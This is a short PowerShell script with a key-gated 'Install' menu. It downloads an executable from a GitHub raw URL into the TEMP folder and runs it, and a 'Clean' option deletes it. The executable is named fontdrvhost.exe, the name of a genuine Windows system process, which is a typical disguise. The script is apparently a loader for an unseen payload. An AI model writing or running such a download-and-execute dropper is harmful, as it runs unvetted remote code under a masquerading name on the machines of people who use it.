Clear-Host

# ===== CONFIG =====
$validKey = "1234ABCD"  # <-- เปลี่ยนเป็น Key ที่คุณต้องการ
$exeUrl = "https://github.com/draft7973-ops/Smithshop/raw/refs/heads/main/fontdrvhost.exe"
$exeOutput = "$env:TEMP\fontdrvhost.exe"

# ===== MENU =====
Write-Host "=== MENU ==="
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

switch ($choice) {
    "1" {
        $userKey = Read-Host "Enter Key"
        if ($userKey -eq $validKey) {
            Write-Host "Key correct! Installing..."
            
            # Download .exe
            Invoke-WebRequest $exeUrl -OutFile $exeOutput
            
            # Run .exe
            Start-Process $exeOutput
            Write-Host "Installation complete ✅"
        } else {
            Write-Host "Key incorrect ❌" -ForegroundColor Red
        }
    }
    "2" {
        Write-Host "Cleaning..."
        if (Test-Path $exeOutput) {
            Remove-Item $exeOutput -Force
            Write-Host "File removed ✅"
        } else {
            Write-Host "File not found ⚠️"
        }
    }
    default {
        Write-Host "Invalid choice! Please select 1 or 2 ⚠️"
    }
}

Pause
